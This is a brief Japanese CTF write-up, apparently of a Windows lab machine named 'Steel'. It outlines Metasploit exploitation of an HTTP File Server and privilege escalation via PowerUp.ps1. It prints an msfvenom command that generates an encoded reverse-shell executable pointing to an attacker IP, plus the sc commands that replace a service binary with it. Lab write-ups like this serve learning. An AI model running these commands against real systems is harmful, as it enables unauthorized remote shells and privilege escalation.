---
title: "Steel"
date: 2024-03-16T14:11:33+09:00
draft: false
---

初めての windows

### user

- HTTP File Server があるので metasploit で CVE を見つける

### root

- windows は PowerUP.ps1 が使える
  - ```upload /PowerUp.ps1```
  - ```Invoke-AllChecks```
- AdvancedSystemCareService9 が再起動できるので，悪意ある exe に置き換える
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe```
- "shell" でシェルを起動
  - ```sc stop AdvancedSystemCareService9```
  - ```copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe```
  - ```sc start AdvancedSystemCareService9```
